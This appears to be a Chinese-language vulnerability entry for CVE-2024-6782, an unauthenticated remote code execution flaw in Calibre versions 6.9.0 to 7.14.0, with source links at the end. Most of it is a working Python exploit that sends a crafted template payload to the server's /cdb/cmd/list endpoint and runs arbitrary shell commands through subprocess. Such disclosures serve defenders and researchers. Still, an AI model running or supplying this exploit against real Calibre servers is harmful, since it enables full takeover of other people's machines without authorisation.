# Calibre远程代码执行漏洞(CVE-2024-6782)

Calibre 6.9.0 ~ 7.14.0 中不当的访问控制允许未经身份验证的攻击者实现远程代码执行。

## poc

```python
#! /usr/bin/env python3
# PoC for: CVE-2024-6782
# Description: Unauthenticated remote code execution in 6.9.0 <= calibre <= 7.14.0
import json
import sys

import requests

_target = "http://localhost:8080"

def exploit(cmd):
    r = requests.post(
        f"{_target}/cdb/cmd/list",
        headers={"Content-Type": "application/json"},
        json=[
            ["template"],
            "", # sortby: leave empty
            "", # ascending: leave empty
            "", # search_text: leave empty, set to all
            1, # limit results
            f"python:def evaluate(a, b):\n import subprocess\n try:\n return subprocess.check_output(['cmd.exe', '/c', '{cmd}']).decode()\n except Exception:\n return subprocess.check_output(['sh', '-c', '{cmd}']).decode()", # payload
        ],
    )

    try:
        print(list(r.json()["result"]["data"]["template"].values())[0])
    except Exception as e:
        print(r.text)

if __name__ == "__main__":
    exploit("whami")
```

![8d4237fcfec48246cfa4fb6fe3e48327_CVE-2024-6782_01 calibre-rce](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408072136806.gif)

## 漏洞来源

- https://github.com/zangjiahe/CVE-2024-6782
- https://mp.weixin.qq.com/s/JlH43FVTgzV0O4m8jII3ug